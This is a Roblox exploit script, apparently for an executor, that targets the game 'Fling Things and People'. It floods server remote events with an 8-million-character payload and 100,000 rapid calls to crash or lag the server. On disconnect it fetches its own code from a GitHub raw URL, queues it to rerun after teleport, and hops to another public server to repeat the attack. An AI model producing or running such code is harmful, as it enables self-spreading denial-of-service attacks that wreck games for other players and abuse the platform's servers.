local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
while not LocalPlayer do
    LocalPlayer = Players.LocalPlayer
    wait()
end

GuiService.ErrorMessageChanged:Connect(function()
    queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/sladostrastnik/OpenSource/refs/heads/main/FlingThingsAndPeople/functions/Karmageddon.luau"))

	local servers = {}
	local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
	local body = HttpService:JSONDecode(req)

	if body and body.data then
		for i, v in next, body.data do
			if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
				table.insert(servers, 1, v.id)
			end
		end
	end

	if #servers > 0 then
		TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], LocalPlayer)
	else
        TeleportService:Teleport(game.PlaceId)
	end
end)

local DataEvents = ReplicatedStorage:WaitForChild("DataEvents")
local Event1 = DataEvents:WaitForChild("UpdateTexturesChoice")
local Event2 = DataEvents:WaitForChild("DataRemoteEvent")

local data = "A"
for i = 1, 23 do data = data .. data end

Event1:FireServer(data)
for i = 1, 100 do
    for i = 1, 1000 do
        Event2:FireServer()
    end task.wait()
end
